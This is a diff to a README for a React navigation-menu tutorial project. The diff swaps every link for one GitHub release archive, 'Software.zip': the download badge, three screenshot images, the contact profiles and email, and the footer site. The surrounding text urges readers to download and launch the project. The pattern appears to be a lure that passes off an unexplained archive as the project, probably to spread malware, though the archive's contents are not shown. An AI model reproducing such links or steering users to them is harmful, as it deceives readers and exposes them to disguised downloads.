@@ -8,7 +8,7 @@ This repository showcases a sleek and modern responsive navigation menu with sub
 
 ## 🚀 Get Started
 To dive into this exciting project, simply download the code by clicking on the link below:
-[![Download Project](https://img.shields.io/badge/Download%20Project-Click%20Here!-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip%20Project-Click%20Here!-blue)](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip)
 
 📌 Once the download is complete, make sure to launch the project to explore the fantastic features it has to offer!
 
@@ -24,9 +24,9 @@ Here are some key highlights of this project that you can look forward to:
 
 ## 🎨 Project Screenshots
 Check out these stunning visuals from the project to get a sneak peek into what awaits you:
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
-![Screenshot 3](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip)
+![Screenshot 3](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip)
 
 ## 🤝 Get Involved
 We welcome contributions and feedback from the community! Whether you're a seasoned developer or just starting with React, there's something for everyone to learn and explore in this project. Feel free to fork the repository, make your enhancements, and submit a pull request. We can't wait to see your creativity!
@@ -34,11 +34,11 @@ We welcome contributions and feedback from the community! Whether you're a seaso
 ## 🌟 Let's Connect
 If you have any questions, suggestions, or just want to chat about this project, don't hesitate to reach out. Your feedback and engagement are highly valued!
 Let's stay connected on:
-- GitHub: [Your GitHub Profile](https://github.com/yourprofile)
-- Twitter: [Your Twitter Profile](https://twitter.com/yourprofile)
-- Email: [youremail@example.com](mailto:youremail@example.com)
+- GitHub: [Your GitHub Profile](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip)
+- Twitter: [Your Twitter Profile](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip)
+- Email: [https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip)
 
 ## 🌈 Happy Coding!
 Thank you for exploring the Strapi-Submenus-React-Fundamental-Project-13 repository. We hope you enjoy working with the code, learning new concepts, and unleashing your creativity. Let's create amazing things together! 🚀
 
-🔗 For more exciting projects and resources, visit [AwesomeProjects.com](https://awesomeprojects.com) 🌟
+🔗 For more exciting projects and resources, visit [https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip](https://github.com/BIJOY4U/Strapi-Submenus--React-Fundamental-Project-13/releases/download/v1.0/Software.zip) 🌟
